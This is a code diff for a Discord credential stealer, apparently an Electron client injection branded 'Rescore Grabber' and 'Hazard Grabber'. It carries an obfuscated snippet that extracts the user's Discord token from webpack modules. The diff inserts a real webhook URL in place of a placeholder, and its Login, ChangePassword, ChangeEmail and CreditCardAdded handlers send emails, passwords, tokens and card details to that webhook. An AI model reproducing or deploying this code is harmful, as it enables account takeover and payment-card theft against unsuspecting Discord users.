@@ -3,7 +3,7 @@ const path = require('path');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://discordapp.com/api/webhooks/955919570219175956/1Z-5BB_XS_HGLBDXBd2AASNSlU42egW35gIv0DVjfEf_RVOt7UjI4lkRUzlNZ-UTfnPK";
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
@@ -163,8 +163,8 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Rescore Grabber By Rescore#3692・https://discord.gg/cFsX8kPE
-"
+                        "text": "Rescore Grabber By Rescore#3692・https://discord.gg/cFsX8kPE"
+
                     }
                 }
             ]
@@ -211,8 +211,8 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rescore#3692・https://discord.gg/cFsX8kPE
-"
+                        "text": "Hazard Grabber By Rescore#3692・https://discord.gg/cFsX8kPE"
+
                     }                 
                 }
             ]
@@ -259,8 +259,8 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Rescore Grabber By Rescore#3692・https://discord.gg/cFsX8kPE
-"
+                        "text": "Rescore Grabber By Rescore#3692・https://discord.gg/cFsX8kPE"
+
                     }                
                 }
             ]
@@ -307,8 +307,8 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Rescore Grabber By Rescore#3692 ・ https://discord.gg/cFsX8kPE
-"
+                        "text": "Rescore Grabber By Rescore#3692 ・ https://discord.gg/cFsX8kPE"
+
                     }
                 }
             ]
